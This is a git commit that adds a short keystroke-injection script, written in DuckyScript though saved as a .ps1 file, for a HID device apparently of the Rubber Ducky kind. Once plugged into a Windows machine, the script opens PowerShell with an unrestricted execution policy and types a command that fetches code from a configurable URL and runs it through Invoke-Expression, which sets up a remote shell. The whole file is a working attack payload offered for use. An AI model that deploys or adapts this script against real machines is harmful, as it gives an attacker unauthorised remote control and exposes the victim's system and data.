b1d752b2b03060f6a0800c1bde3ffaa0effe372a
networkwilbi <159230586+networkwilbi@users.noreply.github.com>
2025-12-27 22:41:05 -0500

    Add HID-based remote access PowerShell script
    This script sets up a HID-based remote shell using PowerShell, including necessary configurations and commands.

---
+++ windows_remote_access.ps1
@@ -0,0 +1,20 @@
+REM       HIDX_Stealth_Link_Remote_Access_PoC_IEX
+REM       Version 1.0
+REM       OS: Windows
+REM       Author: 0i41E
+REM       Requirements: Firmware Version 3.0 minimum, Universal Python Listener, Activated HIDX
+
+REM       HID based remote shell, executed via powershell.
+
+REM Define the URL where you hosted your PoC
+DEFINE #URL https://example.com/
+
+REM Define Keymap below
+DUCKY_LANG us
+DELAY 2000
+GUI r
+DELAY 500
+STRINGLN powershell -executionpolicy unrestricted
+DELAY 1000
+REM Calling HIDX poc via Invoke-Webrequest and execute it via Invoke-Expression
+STRINGLN Invoke-WebRequest -UseBasicParsing -Uri "#URL" | iex;HIDXShell
